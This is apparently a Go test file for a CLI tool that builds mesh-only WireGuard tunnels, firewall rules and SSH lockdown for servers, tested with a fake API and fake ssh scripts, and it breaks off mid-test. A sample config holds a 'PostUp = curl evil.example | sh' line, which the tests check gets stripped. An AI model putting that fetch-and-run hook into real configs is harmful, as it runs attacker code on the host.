package main

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"testing"
)

const sampleConf = `[Interface]
PrivateKey = cHJpdmF0ZWtleXByaXZhdGVrZXlwcml2YXRla2V5MDA=
Address = 10.10.0.9/32, 2602:f5c1:1::9/128
DNS = 10.10.10.10, fd53::
PostUp = curl evil.example | sh

[Peer]
PublicKey = c2VydmVya2V5c2VydmVya2V5c2VydmVya2V5c2VydjA=
Endpoint = vie.doxx.net:51820
AllowedIPs = 0.0.0.0/0, ::/0
`

func TestRewriteConfIsMeshOnly(t *testing.T) {
	out, err := rewriteConf(sampleConf)
	if err != nil {
		t.Fatal(err)
	}
	for _, bad := range []string{"0.0.0.0/0", "::/0", "DNS", "PostUp", "evil"} {
		if strings.Contains(out, bad) {
			t.Errorf("rewritten config still contains %q:\n%s", bad, out)
		}
	}
	for _, want := range []string{"AllowedIPs = 10.0.0.0/8, 2602:f5c1::/36", "PersistentKeepalive = 25", "Endpoint = vie.doxx.net:51820", "PrivateKey = "} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in:\n%s", want, out)
		}
	}
	if got := ConfAddress(out); got != "10.10.0.9" {
		t.Errorf("ConfAddress = %q", got)
	}
}

func TestRenderConfigFromFields(t *testing.T) {
	resp := map[string]any{
		"status":  "success",
		"context": "ignored",
		"config": map[string]any{
			"private_key":       "priv",
			"assigned_ipv4":     "10.10.0.7",
			"assigned_ipv6":     "2602:f5c1::7",
			"server_public_key": "srv",
			"endpoint":          "zrh.doxx.net:51820",
			"dns":               "10.10.10.10",
		},
	}
	out, err := RenderConfig(resp)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"Address = 10.10.0.7/32, 2602:f5c1::7/128", "PublicKey = srv", "AllowedIPs = 10.0.0.0/8, 2602:f5c1::/36"} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in:\n%s", want, out)
		}
	}
	if strings.Contains(out, "DNS") {
		t.Error("DNS must not be set")
	}
}

// The shape config.doxx.net actually returns for wireguard=1.
func TestRenderConfigNested(t *testing.T) {
	resp := map[string]any{"status": "success", "config": map[string]any{
		"interface": map[string]any{"address": "10.25.106.66/32, 2602:f5c1:d::15:200b/128", "dns": "10.10.10.10,fd53::", "private_key": "PRIV="},
		"peer":      map[string]any{"allowed_ips": "0.0.0.0/0, ::/0", "endpoint": "wireguard.fra.eu.doxx.net:51820", "persistent_keepalive": float64(25), "public_key": "SERVERPUB="},
	}}
	conf, err := RenderConfig(resp)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"PrivateKey = PRIV=", "Address = 10.25.106.66/32, 2602:f5c1:d::15:200b/128", "PublicKey = SERVERPUB=", "Endpoint = wireguard.fra.eu.doxx.net:51820", "AllowedIPs = 10.0.0.0/8, 2602:f5c1::/36"} {
		if !strings.Contains(conf, want) {
			t.Errorf("missing %q in:\n%s", want, conf)
		}
	}
	if strings.Contains(conf, "0.0.0.0/0") || strings.Contains(conf, "DNS") {
		t.Errorf("default route or DNS leaked into:\n%s", conf)
	}
	if got := ConfAddress(conf); got != "10.25.106.66" {
		t.Errorf("ConfAddress = %q", got)
	}
}

func TestRenderConfigMissingFields(t *testing.T) {
	_, err := RenderConfig(map[string]any{"private_key": "x"})
	if err == nil || !strings.Contains(err.Error(), "endpoint") {
		t.Fatalf("expected a helpful error, got %v", err)
	}
}

func TestRedactHidesSecrets(t *testing.T) {
	b, _ := json.Marshal(redact(map[string]any{
		"tunnel_token": "tok123",
		"private_key":  "pk123",
		"public_key":   "pub",
		"config":       sampleConf,
	}))
	s := string(b)
	for _, secret := range []string{"tok123", "pk123", "cHJpdmF0ZWtleX"} {
		if strings.Contains(s, secret) {
			t.Errorf("secret %q leaked: %s", secret, s)
		}
	}
	if !strings.Contains(s, "pub") {
		t.Error("public key should stay visible")
	}
}

func TestDefaultName(t *testing.T) {
	cases := map[string]string{
		"root@my-box.example.com": "dxx-my-box",
		"root@203.0.113.10":       "dxx-203-0-113-10",
		"hetzner":                 "dxx-hetzner",
	}
	for in, want := range cases {
		if got := defaultName(in); got != want {
			t.Errorf("defaultName(%q) = %q, want %q", in, got, want)
		}
	}
}

// ---- end-to-end against a fake API and a fake ssh -------------------------

type fakeAPI struct {
	mu      sync.Mutex
	tunnels []map[string]any
	rules   []map[string]any
	calls   []string
	created int
}

func (f *fakeAPI) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	f.mu.Lock()
	defer f.mu.Unlock()
	reply := func(v any) { json.NewEncoder(w).Encode(v) }
	if r.Form.Get("servers") == "" && r.Form.Get("token") != "secret-token" {
		w.WriteHeader(403)
		reply(map[string]any{"status": "error", "error": "invalid_token", "message": "bad token"})
		return
	}
	for ep := range r.Form {
		if r.Form.Get(ep) != "1" {
			continue
		}
		f.calls = append(f.calls, ep)
		switch ep {
		case "servers":
			reply(map[string]any{"status": "success", "servers": []map[string]any{
				{"hostname": "slow.doxx.test", "location": "Far Away"}, {"hostname": "fast.doxx.test", "location": "Next Door"},
			}})
		case "list_tunnels":
			reply(map[string]any{"status": "success", "tunnels": f.tunnels, "context": "..."})
		case "create_tunnel":
			f.created++
			f.tunnels = append(f.tunnels, map[string]any{
				"tunnel_token": fmt.Sprintf("tt-%d", f.created), "name": r.Form.Get("name"), "server": r.Form.Get("server"), "assigned_ip": "10.10.0.9",
			})
			reply(map[string]any{"status": "success"})
		case "wireguard":
			reply(map[string]any{"status": "success", "config": sampleConf})
		case "firewall_rule_list":
			var rules []map[string]any
			for _, x := range f.rules {
				if r.Form.Get("tunnel_token") == "" || x["tunnel_token"] == r.Form.Get("tunnel_token") {
					rules = append(rules, x)
				}
			}
			reply(map[string]any{"status": "success", "rules": rules})
		case "firewall_rule_add":
			f.rules = append(f.rules, map[string]any{"tunnel_token": r.Form.Get("tunnel_token"), "protocol": r.Form.Get("protocol"), "src_ip": r.Form.Get("src_ip"), "src_port": "ALL", "dst_ip": r.Form.Get("dst_ip"), "dst_port": r.Form.Get("dst_port")})
			reply(map[string]any{"status": "success"})
		case "firewall_rule_delete":
			var rest []map[string]any
			for _, x := range f.rules {
				if x["tunnel_token"] != r.Form.Get("tunnel_token") || x["src_ip"] != r.Form.Get("src_ip") || x["dst_port"] != r.Form.Get("dst_port") || r.Form.Get("src_port") != "ALL" {
					rest = append(rest, x)
				}
			}
			f.rules = rest
			reply(map[string]any{"status": "success"})
		case "delete_tunnel":
			var rest []map[string]any
			for _, x := range f.tunnels {
				if x["tunnel_token"] != r.Form.Get("tunnel_token") {
					rest = append(rest, x)
				}
			}
			f.tunnels = rest
			reply(map[string]any{"status": "success"})
		default:
			continue
		}
		return
	}
	w.WriteHeader(400)
	reply(map[string]any{"status": "error", "message": "unknown endpoint"})
}

func TestEndToEnd(t *testing.T) {
	bin := filepath.Join(t.TempDir(), "dxx")
	if out, err := exec.Command("go", "build", "-o", bin, ".").CombinedOutput(); err != nil {
		t.Fatalf("build: %v\n%s", err, out)
	}

	api := &fakeAPI{tunnels: []map[string]any{{"tunnel_token": "tt-laptop", "name": "macbook", "server": "vie", "assigned_ip": "10.10.0.5/32"}}}
	srv := httptest.NewServer(api)
	defer srv.Close()

	// Fake ssh: logs every remote script and its stdin, answers the preflight.
	dir := t.TempDir()
	logf := filepath.Join(dir, "ssh.log")
	fakeSSH := filepath.Join(dir, "ssh")
	writeFakeSSH(t, fakeSSH, logf, filepath.Join(dir, "LOCKED"), "1")

	env := append(os.Environ(), "DOXX_API="+srv.URL, "DOXX_TOKEN=secret-token", "DXX_SSH="+fakeSSH, "DXX_STATE="+filepath.Join(dir, "hosts.json"))
	run := func(args ...string) string {
		cmd := exec.Command(bin, args...)
		cmd.Env = env
		out, err := cmd.CombinedOutput()
		if err != nil {
			t.Fatalf("dxx %v: %v\n%s", args, err, out)
		}
		return string(out)
	}

	out := run("up", "root@203.0.113.10", "--server", "vie.doxx.net", "--name", "hetzner", "--allow-from", "macbook")
	t.Log(out)
	if !strings.Contains(out, "dxx root@203.0.113.10") {
		t.Errorf("expected mesh ssh hint, got:\n%s", out)
	}
	if len(api.rules) != 1 || api.rules[0]["src_ip"] != "10.10.0.5" || api.rules[0]["dst_ip"] != "10.10.0.9" || api.rules[0]["dst_port"] != "22" {
		t.Errorf("unexpected firewall rules: %v", api.rules)
	}
	logb, _ := os.ReadFile(logf)
	log := string(logb)
	for _, want := range []string{"apt-get install", "/etc/wireguard/doxx0.conf", "AllowedIPs = 10.0.0.0/8", "wg-quick@doxx0"} {
		if !strings.Contains(log, want) {
			t.Errorf("remote log missing %q", want)
		}
	}
	if strings.Contains(log, "0.0.0.0/0") || strings.Contains(log, "secret-token") {
		t.Error("default route or token reached the server")
	}
	if strings.Contains(out, "cHJpdmF0ZWtleX") {
		t.Error("private key printed to terminal")
	}

	// Second run is idempotent: reuses the tunnel, does not duplicate the rule.
	out = run("up", "root@203.0.113.10", "--name", "hetzner", "--allow-from", "macbook")
	if !strings.Contains(out, "reusing") || !strings.Contains(out, "rule already present") {
		t.Errorf("second run not idempotent:\n%s", out)
	}
	if len(api.rules) != 1 {
		t.Errorf("rule duplicated: %v", api.rules)
	}

	// Dry run changes nothing.
	before := len(api.calls)
	run("up", "root@203.0.113.10", "--name", "new-one", "--server", "vie.doxx.net", "--dry-run")
	for _, c := range api.calls[before:] {
		if c == "create_tunnel" || c == "firewall_rule_add" {
			t.Errorf("dry run called %s", c)
		}
	}

	// Teardown.
	out = run("down", "root@203.0.113.10", "--name", "hetzner", "--delete-tunnel")
	if !strings.Contains(out, "deleted") || len(api.tunnels) != 1 || api.tunnels[0]["name"] != "macbook" || len(api.rules) != 0 {
		t.Errorf("down failed: tunnels=%v rules=%v\n%s", api.tunnels, api.rules, out)
	}
}

func TestRefusesSecondDoxxLink(t *testing.T) {
	bin := filepath.Join(t.TempDir(), "dxx")
	if out, err := exec.Command("go", "build", "-o", bin, ".").CombinedOutput(); err != nil {
		t.Fatalf("build: %v\n%s", err, out)
	}
	dir := t.TempDir()
	fakeSSH := filepath.Join(dir, "ssh")
	os.WriteFile(fakeSSH, []byte("#!/bin/sh\nprintf 'uid=0\\nsudo=ok\\nwg=yes\\nwgif=wg0\\ndoxxif=wg0\\n'\n"), 0o755)
	cmd := exec.Command(bin, "up", "root@x", "--server", "vie")
	cmd.Env = append(os.Environ(), "DOXX_API=http://127.0.0.1:1/", "DOXX_TOKEN=t", "DXX_SSH="+fakeSSH)
	out, err := cmd.CombinedOutput()
	if err == nil || !strings.Contains(string(out), "--force") {
		t.Fatalf("expected refusal mentioning --force, got err=%v\n%s", err, out)
	}
}

// writeFakeSSH creates a stand-in for ssh that logs every call, answers the
// scripts dxx sends, and simulates the lock: once LOCKED exists, any
// connection without a HostName= override (the public path) times out.
func writeFakeSSH(t *testing.T, path, logf, lockFile, closedPort string) {
	t.Helper()
	script := `#!/bin/sh
if [ "$1" = "-G" ]; then printf 'hostname 127.0.0.1\nport ` + closedPort + `\nuser root\n'; exit 0; fi
mesh=""
while [ "$1" = "-o" ]; do case "$2" in HostName=*) mesh="${2#HostName=}";; esac; shift 2; done
host="$1"; shift
[ "$1" = "--" ] && shift
script="$1"
stdin=$(cat)
{ echo "=== $host mesh=$mesh"; echo "$script"; echo "--- stdin"; echo "$stdin"; } >> "` + logf + `"
if [ -z "$mesh" ] && [ -e "` + lockFile + `" ]; then echo "ssh: connect to host port 22: Operation timed out" >&2; exit 255; fi
case "$script$stdin" in
  *'echo "rtt '*) printf 'rtt slow.doxx.test rtt min/avg/max/mdev = 80.1/81.0/82.0/0.5 ms\nrtt fast.doxx.test rtt min/avg/max/mdev = 3.0/4.0/5.0/1.0 ms\nrtt lost.doxx.test \n' ;;
  *'echo "uid='*) printf 'uid=0\nsudo=ok\nos=ubuntu-24.04\nwg=no\n' ;;
  *DOXXEOF*) touch "` + lockFile + `"; echo armed; echo locked ;;
  *'echo unlocked'*) rm -f "` + lockFile + `"; echo unlocked ;;
  *'print "mesh="'*) printf 'mesh=10.10.0.9/32\nhandshake=ok\n' ;;
  *latest-handshakes*) echo handshake=ok ;;
esac
`
	if err := os.WriteFile(path, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
}

func TestLockUnlock(t *testing.T) {
	bin := filepath.Join(t.TempDir(), "dxx")
	if out, err := exec.Command("go", "build", "-o", bin, ".").CombinedOutput(); err != nil {
		t.Fatalf("build: %v\n%s", err, out)
	}
	dir := t.TempDir()
	logf, lockFile, fakeSSH := filepath.Join(dir, "ssh.log"), filepath.Join(dir, "LOCKED"), filepath.Join(dir, "ssh")
	writeFakeSSH(t, fakeSSH, logf, lockFile, "1") // port 1 on localhost is closed
	env := append(os.Environ(), "DXX_SSH="+fakeSSH, "DXX_STATE="+filepath.Join(dir, "state.json"), "DXX_DIAL_TIMEOUT=500ms")
	run := func(wantOK bool, args ...string) string {
		cmd := exec.Command(bin, args...)
		cmd.Env = env
		out, err := cmd.CombinedOutput()
		if (err == nil) != wantOK {
			t.Fatalf("dxx %v: err=%v\n%s", args, err, out)
		}
		return string(out)
	}

	out := run(true, "lock", "root@hetzner", "--confirm", "120")
	t.Log(out)
	for _, want := range []string{"mesh login works", "rollback disarmed", "no longer reachable", "HostName 10.10.0.9"} {
		if !strings.Contains(out, want) {
			t.Errorf("lock output missing %q", want)
		}
	}
	logb, _ := os.ReadFile(logf)
	log := string(logb)
	// Order matters: mesh test, then lock over public, then disarm over mesh.
	iTest := strings.Index(log, "mesh=10.10.0.9\necho ok")
	iLock := strings.Index(log, "systemd-run --quiet --unit=dxx-rollback --on-active=120")
	iDisarm := strings.Index(log, "systemctl stop dxx-rollback.timer && echo disarmed")
	if !(iTest >= 0 && iLock > iTest && iDisarm > iLock) {
		t.Errorf("wrong order: test=%d lock=%d disarm=%d", iTest, iLock, iDisarm)
	}
	if !strings.Contains(log, "HostKeyAlias=") && !strings.Contains(log, "tcp dport { 1 } counter drop") {
		t.Errorf("lock should close the resolved ssh port")
	}

	// While locked, public SSH is gone: down must not run via public, and
	// unlock must go via the remembered mesh IP.
	run(false, "down", "root@hetzner")
	out = run(true, "unlock", "root@hetzner")
	if !strings.Contains(out, "via mesh 10.10.0.9") || !strings.Contains(out, "lock removed") {
		t.Errorf("unlock output:\n%s", out)
	}
	if _, err := os.Stat(lockFile); err == nil {
		t.Error("still locked after unlock")
	}
}

func TestLockAbortsWhenMeshFails(t *testing.T) {
	bin := filepath.Join(t.TempDir(), "dxx")
	if out, err := exec.Command("go", "build", "-o", bin, ".").CombinedOutput(); err != nil {
		t.Fatalf("build: %v\n%s", err, out)
	}
	dir := t.TempDir()
	fakeSSH := filepath.Join(dir, "ssh")
	os.WriteFile(fakeSSH, []byte(`#!/bin/sh
if [ "$1" = "-G" ]; then printf 'hostname 127.0.0.1\nport 22\n'; exit 0; fi
case "$*" in
  *HostName=*) exit 255 ;;
  *DOXXEOF*|*systemd-run*) echo "LOCK WAS SENT" >&2; exit 0 ;;
  *) printf 'mesh=10.10.0.9/32\nhandshake=ok\n' ;;
esac
`), 0o755)
	cmd := exec.Command(bin, "lock", "root@hetzner")
	cmd.Env = append(os.Environ(), "DXX_SSH="+fakeSSH)
	out, err := cmd.CombinedOutput()
	if err == nil || !strings.Contains(string(out), "nothing was changed") || strings.Contains(string(out), "LOCK WAS SENT") {
		t.Fatalf("lock must abort before touching the server when mesh SSH fails:\n%s", out)
	}
}

func TestRulesetAndScriptSyntax(t *testing.T) {
	for _, all := range []bool{false, true} {
		rs := nftRuleset("doxx0", []int{22, 2222}, all)
		if !strings.Contains(rs, `iifname "doxx0" accept`) || !strings.Contains(rs, "ct state established,related accept") {
			t.Errorf("ruleset missing essentials:\n%s", rs)
		}
		if nft, err := exec.LookPath("nft"); err == nil {
			f := filepath.Join(t.TempDir(), "r.nft")
			os.WriteFile(f, []byte(rs), 0o600)
			if out, err := exec.Command(nft, "-c", "-f", f).CombinedOutput(); err != nil {
				if strings.Contains(string(out), "Operation not permitted") {
					t.Log("nft -c needs privileges here; skipped")
				} else {
					t.Errorf("nft rejects ruleset (all=%v): %v\n%s\n%s", all, err, out, rs)
				}
			}
		}
	}
	for name, s := range map[string]string{"lock": lockScript("doxx0", []int{22}, false, 300), "unlock": unlockScript} {
		cmd := exec.Command("sh", "-n")
		cmd.Stdin = strings.NewReader(s)
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Errorf("%s script syntax: %v\n%s", name, err, out)
		}
	}
}

func TestFindTarget(t *testing.T) {
	cases := []struct {
		args []string
		want int
	}{
		{[]string{"hetzner"}, 0},
		{[]string{"hetzner", "htop"}, 0},
		{[]string{"-L", "8080:localhost:80", "hetzner"}, 2},
		{[]string{"-L8080:localhost:80", "hetzner"}, 1},
		{[]string{"-v", "-A", "-p", "2222", "root@hetzner", "uptime"}, 4},
		{[]string{"-tt", "hetzner"}, 1},
		{[]string{"-o", "LogLevel=ERROR", "hetzner"}, 2},
		{[]string{"-vp", "22", "hetzner"}, 2},
		{[]string{"--", "hetzner"}, 1},
		{[]string{"-v"}, -1},
	}
	for _, c := range cases {
		if got := findTarget(c.args); got != c.want {
			t.Errorf("findTarget(%v) = %d, want %d", c.args, got, c.want)
		}
	}
}

func TestDxx(t *testing.T) {
	dir := t.TempDir()
	dxx := filepath.Join(dir, "dxx")
	if out, err := exec.Command("go", "build", "-o", dxx, ".").CombinedOutput(); err != nil {
		t.Fatalf("build: %v\n%s", err, out)
	}
	logf := filepath.Join(dir, "argv.log")
	fakeSSH := filepath.Join(dir, "ssh")
	os.WriteFile(fakeSSH, []byte(`#!/bin/sh
if [ "$1" = "-G" ]; then printf 'hostname 203.0.113.10\nport 22\nuser root\n'; exit 0; fi
echo "$*" > "`+logf+`"
`), 0o755)
	state := filepath.Join(dir, "state.json")
	os.WriteFile(state, []byte(`{"root@203.0.113.10":{"mesh_ip":"10.10.0.9","iface":"doxx0"},"hetzner":{"mesh_ip":"10.10.0.20","iface":"doxx0"}}`), 0o600)
	env := append(os.Environ(), "DXX_SSH="+fakeSSH, "DXX_STATE="+state, "DXX_NO_CHECK=1", "DOXX_TOKEN_FILE=/nonexistent")

	cases := map[string][]string{
		// typed exactly as set up
		"-o HostName=10.10.0.9 -o HostKeyAlias=203.0.113.10 root@203.0.113.10": {"root@203.0.113.10"},
		// without the user: stored user is used
		"-o HostName=10.10.0.9 -o HostKeyAlias=203.0.113.10 root@203.0.113.10 uptime": {"203.0.113.10", "uptime"},
		// ssh options before and after are preserved in place
		"-L 8080:localhost:80 -o HostName=10.10.0.20 -o HostKeyAlias=203.0.113.10 hetzner": {"-L", "8080:localhost:80", "hetzner"},
		// explicit user overrides
		"-o HostName=10.10.0.20 -o HostKeyAlias=203.0.113.10 deploy@hetzner": {"deploy@hetzner"},
		// raw mesh IP
		"-o HostName=10.10.0.33 -o HostKeyAlias=203.0.113.10 root@10.10.0.33": {"root@10.10.0.33"},
	}
	for want, args := range cases {
		os.Remove(logf)
		cmd := exec.Command(dxx, args...)
		cmd.Env = env
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("dxx %v: %v\n%s", args, err, out)
		}
		got, _ := os.ReadFile(logf)
		if strings.TrimSpace(string(got)) != want {
			t.Errorf("dxx %v\n  ran: ssh %s\n want: ssh %s", args, strings.TrimSpace(string(got)), want)
		}
	}

	// Unknown host: clear error, ssh is never run.
	os.Remove(logf)
	cmd := exec.Command(dxx, "nowhere")
	cmd.Env = env
	out, err := cmd.CombinedOutput()
	if err == nil || !strings.Contains(string(out), "don't know a doxx mesh IP") {
		t.Errorf("expected helpful error, got %v\n%s", err, out)
	}
	if _, err := os.Stat(logf); err == nil {
		t.Error("ssh must not run for an unknown host")
	}

	// A host named like a subcommand, after "--": our options stay before it.
	os.WriteFile(state, []byte(`{"up":{"mesh_ip":"10.10.0.50"}}`), 0o600)
	cmd = exec.Command(dxx, "-v", "--", "up")
	cmd.Env = env
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("dxx -- up: %v\n%s", err, out)
	}
	got, _ := os.ReadFile(logf)
	if strings.TrimSpace(string(got)) != "-v -o HostName=10.10.0.50 -o HostKeyAlias=203.0.113.10 up" {
		t.Errorf("dxx -v -- up ran: ssh %s", got)
	}

	// Subcommands still work from the same binary.
	cmd = exec.Command(dxx, "ls")
	cmd.Env = env
	if out, err := cmd.CombinedOutput(); err != nil || !strings.Contains(string(out), "10.10.0.50") {
		t.Errorf("dxx ls: %v\n%s", err, out)
	}
}

func TestNamedServers(t *testing.T) {
	dir := t.TempDir()
	dxx := filepath.Join(dir, "dxx")
	if out, err := exec.Command("go", "build", "-o", dxx, ".").CombinedOutput(); err != nil {
		t.Fatalf("build: %v\n%s", err, out)
	}
	api := &fakeAPI{tunnels: []map[string]any{{"tunnel_token": "tt-laptop", "name": "macbook", "assigned_ip": "10.10.0.5"}}}
	srv := httptest.NewServer(api)
	defer srv.Close()
	logf, lockFile, fakeSSH := filepath.Join(dir, "ssh.log"), filepath.Join(dir, "LOCKED"), filepath.Join(dir, "ssh")
	writeFakeSSH(t, fakeSSH, logf, lockFile, "1")
	state := filepath.Join(dir, "hosts.json")
	env := append(os.Environ(), "DOXX_API="+srv.URL, "DOXX_TOKEN=secret-token", "DXX_SSH="+fakeSSH,
		"DXX_STATE="+state, "DXX_NO_CHECK=1", "DXX_DIAL_TIMEOUT=300ms")
	run := func(wantOK bool, args ...string) string {
		t.Helper()
		cmd := exec.Command(dxx, args...)
		cmd.Env = env
		out, err := cmd.CombinedOutput()
		if (err == nil) != wantOK {
			t.Fatalf("dxx %v: err=%v\n%s", args, err, out)
		}
		return string(out)
	}
	lastSSH := func() string {
		b, _ := os.ReadFile(logf)
		parts := strings.Split(string(b), "=== ")
		return strings.SplitN(parts[len(parts)-1], "\n", 2)[0]
	}

	// up --as saves the name; the tunnel is named after it.
	out := run(true, "up", "root@203.0.113.10", "--as", "hetzner", "--server", "vie.doxx.net", "--allow-from", "macbook")
	if !strings.Contains(out, "dxx hetzner") || !strings.Contains(out, `Tunnel "dxx-hetzner"`) {
		t.Errorf("up --as output:\n%s", out)
	}

	// Connect by name; explicit user overrides the stored one.
	run(true, "hetzner")
	if got := lastSSH(); got != "root@203.0.113.10 mesh=10.10.0.9" {
		t.Errorf("dxx hetzner ran ssh to %q", got)
	}
	run(true, "deploy@hetzner")
	if got := lastSSH(); got != "deploy@203.0.113.10 mesh=10.10.0.9" {
		t.Errorf("dxx deploy@hetzner ran ssh to %q", got)
	}

	// Subcommands take the name too, and reuse the saved tunnel.
	out = run(true, "up", "hetzner")
	if !strings.Contains(out, `Tunnel "dxx-hetzner"`) || !strings.Contains(out, "reusing") {
		t.Errorf("up by name:\n%s", out)
	}
	out = run(true, "lock", "hetzner")
	if !strings.Contains(out, "dxx unlock hetzner") {
		t.Errorf("lock by name:\n%s", out)
	}
	run(true, "unlock", "hetzner")

	// Rename and list.
	run(true, "name", "box", "hetzner")
	out = run(true, "ls")
	if !strings.Contains(out, "box") || strings.Contains(out, "hetzner ") || !strings.Contains(out, "root@203.0.113.10") {
		t.Errorf("ls after rename:\n%s", out)
	}
	run(true, "box")
	if got := lastSSH(); got != "root@203.0.113.10 mesh=10.10.0.9" {
		t.Errorf("dxx box ran ssh to %q", got)
	}

	// Name a server that isn't on doxx yet, then refuse bad names.
	out = run(true, "name", "other", "root@198.51.100.7")
	if !strings.Contains(out, "not on doxx yet") {
		t.Errorf("name without mesh:\n%s", out)
	}
	run(false, "name", "lock", "root@198.51.100.7")
	run(false, "name", "box", "root@198.51.100.7") // taken
	run(false, "up", "root@198.51.100.7", "--as", "box", "--server", "vie")

	run(true, "forget", "other")
	if strings.Contains(run(true, "ls"), "other") {
		t.Error("forget did not remove the entry")
	}
}

func TestConnectDisconnect(t *testing.T) {
	dir := t.TempDir()
	dxx := filepath.Join(dir, "dxx")
	if out, err := exec.Command("go", "build", "-o", dxx, ".").CombinedOutput(); err != nil {
		t.Fatalf("build: %v\n%s", err, out)
	}
	api := &fakeAPI{}
	srv := httptest.NewServer(api)
	defer srv.Close()

	// Fake wg-quick, wg and ping; DXX_SUDO= runs them without sudo.
	bin := filepath.Join(dir, "bin")
	os.Mkdir(bin, 0o755)
	wgLog := filepath.Join(dir, "wg-quick.log")
	for name, script := range map[string]string{
		"wg-quick": `echo "$1 $2" >> "` + wgLog + `"`,
		"wg":       `printf 'utun9\tc2VydmVya2V5c2VydmVya2V5c2VydmVya2V5c2VydjA=\t1700000000\n'`,
		"ping": `case "$*" in
  *fast*) echo "round-trip min/avg/max/stddev = 5.0/6.0/7.0/1.0 ms" ;;
  *slow*) echo "round-trip min/avg/max/stddev = 90.0/95.0/99.0/1.0 ms" ;;
esac`,
	} {
		if err := os.WriteFile(filepath.Join(bin, name), []byte("#!/bin/sh\n"+script+"\n"), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	logf, fakeSSH := filepath.Join(dir, "ssh.log"), filepath.Join(dir, "ssh")
	writeFakeSSH(t, fakeSSH, logf, filepath.Join(dir, "LOCKED"), "1")
	conf, local := filepath.Join(dir, "dxx.conf"), filepath.Join(dir, "dxx-local.json")
	env := append(os.Environ(), "DOXX_API="+srv.URL, "DOXX_TOKEN=secret-token", "DXX_SSH="+fakeSSH,
		"DXX_STATE="+filepath.Join(dir, "hosts.json"), "DXX_WG_QUICK="+filepath.Join(bin, "wg-quick"),
		"DXX_PING="+filepath.Join(bin, "ping"), "DXX_SUDO=")
	run := func(args ...string) string {
		t.Helper()
		cmd := exec.Command(dxx, args...)
		cmd.Env = env
		out, err := cmd.CombinedOutput()
		if err != nil {
			t.Fatalf("dxx %v: %v\n%s", args, err, out)
		}
		return string(out)
	}
	wgCalls := func() string {
		b, _ := os.ReadFile(wgLog)
		return string(b)
	}

	// First connect: tunnel created on the fastest location, mesh-only config.
	out := run("connect")
	t.Log(out)
	if len(api.tunnels) != 1 || api.tunnels[0]["server"] != "fast.doxx.test" || !strings.HasPrefix(api.tunnels[0]["name"].(string), "dxx-") {
		t.Fatalf("unexpected tunnels: %v", api.tunnels)
	}
	if !strings.Contains(out, "handshake with doxx.net") || strings.Contains(out, "cHJpdmF0ZWtleX") {
		t.Errorf("connect output:\n%s", out)
	}
	st, err := os.Stat(conf)
	if err != nil || st.Mode().Perm() != 0o600 {
		t.Fatalf("config not written with mode 600: %v", err)
	}
	b, _ := os.ReadFile(conf)
	if c := string(b); !strings.Contains(c, "AllowedIPs = 10.0.0.0/8") || strings.Contains(c, "0.0.0.0/0") || strings.Contains(c, "DNS") || strings.Contains(c, "PostUp") {
		t.Errorf("local config is not mesh-only:\n%s", redactConf(c))
	}
	if wgCalls() != "up "+conf+"\n" {
		t.Errorf("wg-quick calls: %q", wgCalls())
	}

	// Again: reuses the remembered tunnel. Dry run creates nothing.
	if out = run("connect"); !strings.Contains(out, "reusing") || len(api.tunnels) != 1 {
		t.Errorf("second connect not idempotent:\n%s", out)
	}
	before := len(api.calls)
	run("connect", "--name", "other", "--dry-run")
	for _, c := range api.calls[before:] {
		if c == "create_tunnel" {
			t.Error("dry run created a tunnel")
		}
	}

	// disconnect takes it down and leaves no key on disk.
	run("disconnect")
	if _, err := os.Stat(conf); err == nil || !strings.HasSuffix(wgCalls(), "down "+conf+"\n") {
		t.Errorf("disconnect: conf still there or no wg-quick down: %q", wgCalls())
	}
	if out = run("disconnect", "--delete-tunnel"); !strings.Contains(out, "not connected") || len(api.tunnels) != 0 {
		t.Errorf("disconnect --delete-tunnel:\n%s", out)
	}
	if _, err := os.Stat(local); err == nil {
		t.Error("local state kept after --delete-tunnel")
	}

	// up without --allow-from allows the tunnel connect remembered.
	api.tunnels = []map[string]any{{"tunnel_token": "tt-laptop", "name": "macbook", "server": "vie", "assigned_ip": "10.10.0.5"}}
	run("connect", "--name", "macbook")
	// Without --server it picks the location closest to the server.
	out = run("up", "root@203.0.113.10", "--as", "hetzner")
	if n := len(api.tunnels); n != 2 || api.tunnels[n-1]["server"] != "fast.doxx.test" {
		t.Errorf("up without --server: tunnels=%v\n%s", api.tunnels, out)
	}
	if len(api.rules) != 1 || api.rules[0]["src_ip"] != "10.10.0.5" || !strings.Contains(out, "dxx hetzner") {
		t.Errorf("up did not default --allow-from: rules=%v\n%s", api.rules, out)
	}
}

// A server that only takes a password: one interactive login opens the shared
// connection, every later call goes through the same control socket.
func TestPasswordLoginUsesOneConnection(t *testing.T) {
	dir := t.TempDir()
	dxx := filepath.Join(dir, "dxx")
	if out, err := exec.Command("go", "build", "-o", dxx, ".").CombinedOutput(); err != nil {
		t.Fatalf("build: %v\n%s", err, out)
	}
	srv := httptest.NewServer(&fakeAPI{})
	defer srv.Close()
	logf, fakeSSH := filepath.Join(dir, "ssh.log"), filepath.Join(dir, "ssh")
	os.WriteFile(fakeSSH, []byte(`#!/bin/sh
if [ "$1" = "-G" ]; then printf 'hostname 127.0.0.1\nport 22\n'; exit 0; fi
echo "$*" | head -1 >> "`+logf+`"
case "$*" in *BatchMode=yes*) exit 255 ;; esac
printf 'uid=0\nsudo=ok\nwg=yes\n'
`), 0o755)
	cmd := exec.Command(dxx, "up", "root@203.0.113.10", "--server", "vie.doxx.net", "--dry-run")
	cmd.Env = append(os.Environ(), "DOXX_API="+srv.URL, "DOXX_TOKEN=secret-token", "DXX_SSH="+fakeSSH, "DXX_STATE="+filepath.Join(dir, "hosts.json"))
	outb, err := cmd.CombinedOutput()
	out := string(outb)
	if err != nil {
		t.Fatalf("up: %v\n%s", err, out)
	}
	if !strings.Contains(out, "password login") || strings.ContainsAny(out, "\r\x1b") {
		t.Errorf("expected a plain password-login hint and no spinner codes when piped:\n%q", out)
	}
	logb, _ := os.ReadFile(logf)
